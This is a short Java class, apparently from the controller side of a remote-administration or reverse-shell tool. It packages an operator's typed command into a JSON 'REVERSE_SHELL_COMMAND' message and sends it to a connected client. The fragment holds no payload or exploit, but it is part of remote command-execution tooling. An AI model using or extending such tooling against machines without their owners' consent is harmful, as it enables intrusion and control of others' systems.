package TableUtils.ReverseShell.Events;

import TableUtils.ReverseShell.ReverseShellGUI;
import Utilities.AbstractEventGUI;
import org.json.JSONObject;

import java.io.IOException;


public class CommandEvent extends AbstractEventGUI<ReverseShellGUI> {

    private final String command;
    public CommandEvent(ReverseShellGUI reverseShellGUI, String command) {
        super(reverseShellGUI);
        this.command = command;
    }

    @Override
    public void run() {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION","REVERSE_SHELL_COMMAND");
        jsonObject.put("command", command);
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            handleGuiError();
        }
    }
}
